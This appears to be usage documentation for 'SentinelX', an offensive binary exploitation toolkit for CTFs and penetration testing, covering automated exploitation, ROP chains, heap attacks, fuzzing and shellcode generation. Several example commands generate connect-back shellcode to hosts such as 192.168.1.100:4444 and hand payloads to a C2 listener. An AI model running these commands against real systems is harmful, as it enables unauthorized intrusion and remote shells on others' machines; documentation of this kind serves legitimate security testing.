# SentinelX Pwn Toolkit Documentation

## Overview

The SentinelX Pwn Toolkit is a comprehensive binary exploitation framework designed for CTF competitions, penetration testing, and security research. It combines advanced exploitation techniques with automated analysis to provide a powerful toolkit for security professionals.

## Available Pwn Tasks

### 1. **autopwn** - Automated Binary Exploitation
Automated exploitation using symbolic execution and pattern matching.

```bash
# Basic usage
sentinelx run autopwn -p '{"binary": "./target_binary"}'

# With specific strategy
sentinelx run autopwn -p '{"binary": "./target", "strategy": "symbolic", "timeout": 300}'

# With target string
sentinelx run autopwn -p '{"binary": "./target", "target": "flag{", "strategy": "fuzzing"}'
```

**Parameters:**
- `binary` (required): Path to target binary
- `strategy`: "symbolic", "fuzzing", "pattern", or "auto" (default: "auto")
- `target`: Target string to find (default: "flag")
- `timeout`: Analysis timeout in seconds (default: 300)

### 2. **binary-pwn** - Advanced Binary Exploitation
Comprehensive binary exploitation with multiple techniques.

```bash
# Auto-detect exploitation strategy
sentinelx run binary-pwn -p '{"binary": "./target"}'

# Specific exploitation type
sentinelx run binary-pwn -p '{"binary": "./target", "type": "buffer_overflow"}'

# With target function
sentinelx run binary-pwn -p '{"binary": "./target", "type": "ret2libc", "target_function": "win"}'
```

**Exploitation Types:**
- `buffer_overflow`: Classic buffer overflow attacks
- `rop_chain`: Return-Oriented Programming chains
- `ret2libc`: Return-to-libc attacks
- `format_string`: Format string vulnerabilities
- `shellcode_injection`: Direct shellcode injection
- `auto`: Automatically select best technique

### 3. **rop-exploit** - ROP Chain Generation
Advanced ROP (Return-Oriented Programming) chain builder.

```bash
# Generate execve ROP chain
sentinelx run rop-exploit -p '{"binary": "./target", "type": "execve", "target": "/bin/sh"}'

# Generate system() ROP chain
sentinelx run rop-exploit -p '{"binary": "./target", "type": "system", "target": "/bin/sh"}'

# Open-Read-Write chain for file reading
sentinelx run rop-exploit -p '{"binary": "./target", "type": "open_read_write", "target": "flag.txt"}'

# With libc for better gadgets
sentinelx run rop-exploit -p '{"binary": "./target", "libc": "/lib/x86_64-linux-gnu/libc.so.6"}'
```

**Chain Types:**
- `execve`: Generate execve("/bin/sh") ROP chain
- `system`: Generate system("/bin/sh") ROP chain  
- `open_read_write`: File reading ROP chain
- `mprotect`: Make stack executable
- `sigreturn`: SIGRETURN ROP chains (SROP)
- `auto`: Try multiple chain types

### 4. **heap-exploit** - Heap Exploitation
Modern heap exploitation techniques for glibc malloc.

```bash
# Auto-detect heap vulnerabilities
sentinelx run heap-exploit -p '{"binary": "./heap_challenge"}'

# Specific heap technique
sentinelx run heap-exploit -p '{"binary": "./target", "technique": "fastbin_dup"}'

# With libc version
sentinelx run heap-exploit -p '{"binary": "./target", "technique": "tcache_poison", "libc": "./libc.so.6"}'
```

**Heap Techniques:**
- `fastbin_dup`: Fastbin duplication attack
- `tcache_poison`: Tcache poisoning (glibc 2.26+)
- `double_free`: Double free vulnerabilities
- `house_of_spirit`: House of Spirit technique
- `house_of_orange`: House of Orange (FILE structure)
- `house_of_einherjar`: House of Einherjar (off-by-one)
- `unsorted_bin`: Unsorted bin attack
- `auto`: Try multiple heap techniques

### 5. **pwn-toolkit** - Comprehensive Analysis
All-in-one pwn analysis combining multiple techniques.

```bash
# Full analysis (all techniques)
sentinelx run pwn-toolkit -p '{"binary": "./challenge"}'

# Quick analysis (common techniques only)
sentinelx run pwn-toolkit -p '{"binary": "./target", "mode": "quick"}'

# Custom technique selection
sentinelx run pwn-toolkit -p '{"binary": "./target", "mode": "custom", "techniques": ["buffer_overflow", "rop_chain", "heap_exploit"]}'
```

**Analysis Modes:**
- `full`: Comprehensive analysis with all techniques (default)
- `quick`: Fast analysis with common techniques
- `custom`: User-specified technique list

### 6. **fuzzer** - Intelligent Fuzzing
Multi-protocol fuzzing for vulnerability discovery.

```bash
# SQL injection fuzzing
sentinelx run fuzzer -p '{"target": "http://example.com/login", "type": "sql"}'

# Buffer overflow fuzzing
sentinelx run fuzzer -p '{"target": "./binary", "type": "buffer_overflow"}'

# Custom payload fuzzing
sentinelx run fuzzer -p '{"target": "localhost:9999", "type": "custom", "payloads": ["AAAA", "BBBB"]}'
```

### 7. **shellcode** - Shellcode Generation
Multi-architecture shellcode generation and encoding.

```bash
# Generate /bin/sh shellcode
sentinelx run shellcode -p '{"arch": "x86_64", "type": "sh"}'

# Connect-back shell
sentinelx run shellcode -p '{"arch": "i386", "type": "connect", "host": "192.168.1.100", "port": 4444}'

# Custom execve shellcode
sentinelx run shellcode -p '{"arch": "x86_64", "type": "execve", "command": "/bin/bash", "args": ["-i"]}'
```

**Architectures:** `x86_64`, `i386`, `arm`, `aarch64`, `mips`, `mips64`
**Shellcode Types:** `sh`, `execve`, `connect`, `bind`, `download`, `stager`

## Advanced Usage Examples

### CTF Binary Analysis
```bash
# Comprehensive CTF challenge analysis
sentinelx run pwn-toolkit -p '{
    "binary": "./challenge",
    "mode": "full",
    "libc": "./libc.so.6"
}'
```

### ROP Chain Development
```bash
# Generate multiple ROP chains
sentinelx run rop-exploit -p '{
    "binary": "./target",
    "type": "auto",
    "target": "/bin/sh",
    "libc": "/lib/x86_64-linux-gnu/libc.so.6"
}'
```

### Heap Vulnerability Research
```bash
# Modern heap exploitation analysis
sentinelx run heap-exploit -p '{
    "binary": "./heap_challenge",
    "technique": "auto",
    "libc": "./libc-2.35.so"
}'
```

### Custom Exploitation Workflow
```bash
# 1. Initial analysis
sentinelx run binary-pwn -p '{"binary": "./target", "type": "auto"}'

# 2. Specific technique based on results
sentinelx run rop-exploit -p '{"binary": "./target", "type": "system"}'

# 3. Generate payload
sentinelx run shellcode -p '{"arch": "x86_64", "type": "connect", "host": "10.0.0.1", "port": 1337}'
```

## Dependencies

The pwn toolkit requires additional dependencies for full functionality:

```bash
# Core dependencies
pip install pwntools

# Optional for enhanced analysis
pip install angr          # Symbolic execution
pip install capstone      # Disassembly
pip install ropper        # ROP gadget finding

# System tools (Ubuntu/Debian)
sudo apt-get install binutils gdb ltrace strace
```

## Security Considerations

⚠️ **WARNING**: The SentinelX Pwn Toolkit is designed for authorized security testing only. 

- Only use on systems you own or have explicit permission to test
- Generated exploits can cause system crashes or data loss
- Shellcode and ROP chains are potentially harmful
- Always test in isolated environments first

## Output Formats

All pwn tasks return structured JSON output with:

```json
{
    "status": "complete|error|partial",
    "binary_info": {
        "arch": "x86_64",
        "bits": 64,
        "protections": {...}
    },
    "exploits": {
        "technique_name": {
            "status": "working|failed",
            "payloads": {...},
            "analysis": {...}
        }
    },
    "summary": {
        "vulnerability_level": "high|medium|low",
        "recommended_techniques": [...],
        "difficulty": "easy|medium|hard"
    }
}
```

## Integration with Other SentinelX Tasks

The pwn toolkit integrates seamlessly with other SentinelX modules:

```bash
# Combine with forensics for post-exploitation
sentinelx workflow -f exploit_and_analyze.yaml

# Use with AI assistance for payload optimization
sentinelx run llm-assist -p '{"task": "optimize_rop_chain", "context": "..."}'

# Integration with C2 for post-exploitation
sentinelx run c2 -p '{"payload": "generated_shellcode", "listener": "192.168.1.100:4444"}'
```

## Performance Tips

1. **Use specific techniques** instead of auto-detection for faster results
2. **Provide libc path** when available for better ROP gadget finding
3. **Set reasonable timeouts** for symbolic execution (default 300s)
4. **Use quick mode** for initial analysis, then deep-dive with specific techniques
5. **Cache binary analysis results** when testing multiple exploitation techniques

## Troubleshooting

### Common Issues

**pwntools not found:**
```bash
pip install pwntools
```

**angr installation issues:**
```bash
# Use conda for better angr support
conda install angr
```

**Binary not executable:**
```bash
chmod +x ./target_binary
```

**Permission denied:**
```bash
# Run with appropriate permissions or in container
docker run --rm -v $(pwd):/workspace sentinelx run pwn-toolkit -p '{"binary": "/workspace/target"}'
```

### Debug Mode

Enable detailed logging for troubleshooting:

```bash
sentinelx run pwn-toolkit -p '{"binary": "./target", "debug": true}' --log-level DEBUG
```

## Contributing to Pwn Toolkit

The pwn toolkit is designed to be extensible. To add new exploitation techniques:

1. Create new technique class inheriting from `Task`
2. Implement the required methods
3. Add to the technique registry
4. Update documentation and tests

See `docs/DEVELOPER_GUIDE.md` for detailed contribution guidelines.

---

*The SentinelX Pwn Toolkit: Where elite cybersecurity meets systematic exploitation.* 🦁⚔️
